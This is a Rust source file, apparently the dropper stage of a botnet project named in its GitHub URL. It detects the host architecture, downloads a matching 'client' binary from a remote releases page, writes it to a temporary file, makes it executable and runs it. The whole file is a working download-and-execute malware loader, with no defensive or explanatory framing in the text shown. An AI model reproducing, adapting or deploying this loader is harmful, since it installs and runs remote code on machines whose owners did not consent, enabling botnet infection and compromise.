use std::{io::Write, path::Path, process::Command};

const ARCH: &'static str = std::env::consts::ARCH;
const REPO: &'static str =
    "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
const PAYLOAD: &'static str = "client";

/// Spawns a tasks and runs the payload
fn drop(path: &Path) {
    println!("[+] Dropping payload {:?}", path.to_str());
    Command::new(path).spawn().unwrap().wait().unwrap();
}

fn main() {
    // Get architecture
    println!("Architecture: {}", ARCH);

    // You can also get the OS
    let os = std::env::consts::OS;
    println!("Operating System: {}", os);

    let client = reqwest::blocking::Client::new();

    let url = format!("{}/{}-{}", REPO, PAYLOAD, ARCH);
    println!("[+] Getting payload from: {}", url);

    let response = client
        .get(url)
        .send();

    let payload = response.expect("Error retrieving payload");

    let mut temp_file = tempfile::NamedTempFile::new().expect("Failed to create a temporary file");
    temp_file
        .write_all(&payload.bytes().unwrap())
        .expect("Failed to write payload to file");

    temp_file.flush().expect("Failed to flush buffer");

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = temp_file.as_file().metadata().unwrap().permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(temp_file.path(), perms).unwrap();
    }

    drop(temp_file.path());
}
